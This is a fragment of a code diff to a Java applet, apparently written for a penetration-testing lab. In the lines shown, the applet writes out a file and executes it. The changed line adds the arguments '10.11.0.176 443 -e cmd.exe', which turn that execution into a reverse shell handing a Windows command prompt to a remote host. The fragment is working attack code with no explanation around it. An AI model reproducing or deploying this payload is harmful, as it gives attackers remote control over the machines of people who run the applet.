@@ -42,7 +42,7 @@ public class Java extends Applet {
 			   out.flush();
 		 out.close();
 			   in.close();
-			   f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
+			   f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.176 443 -e cmd.exe");
 		 }
 
 	} catch(IOException e) {
